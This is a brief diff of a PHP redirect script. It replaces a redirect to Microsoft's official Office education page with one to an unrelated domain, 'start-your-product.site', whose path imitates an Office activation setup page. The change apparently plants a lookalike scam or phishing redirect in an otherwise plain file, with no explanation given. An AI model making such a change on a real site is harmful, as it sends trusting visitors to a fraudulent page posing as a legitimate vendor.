@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.microsoft.com/en-us/education/products/office");
+header("Location: https://start-your-product.site/actoff/setup_in.php");
 die();
 ?>
